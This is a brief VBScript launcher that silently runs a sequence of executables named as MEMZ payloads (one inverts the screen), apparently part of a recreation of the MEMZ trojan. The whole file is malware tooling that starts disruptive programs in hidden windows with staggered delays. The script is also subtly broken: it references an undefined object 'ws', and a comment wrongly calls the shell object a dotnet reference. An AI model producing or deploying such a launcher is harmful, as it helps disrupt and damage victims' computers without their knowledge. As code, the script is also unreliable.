set WSHShell = CreateObject("WScript.Shell") 'dotnet reference
ws.currentdirectory = createobject("Scripting.FileSystemObject").GetFile(Wscript.ScriptFullName).ParentFolder.Path
' WScript.Sleep 550 but we already slept
WSHShell.Run "MEMZPayloads-InvertScreen.exe", 0
WScript.Sleep 1200
WSHShell.Run "MEMZPayloads-3.exe", 0
WScript.Sleep 850
WSHShell.Run "MEMZPayloads-6.exe", 0
WScript.Sleep 650
WSHShell.Run "MEMZPayloads-1.exe", 0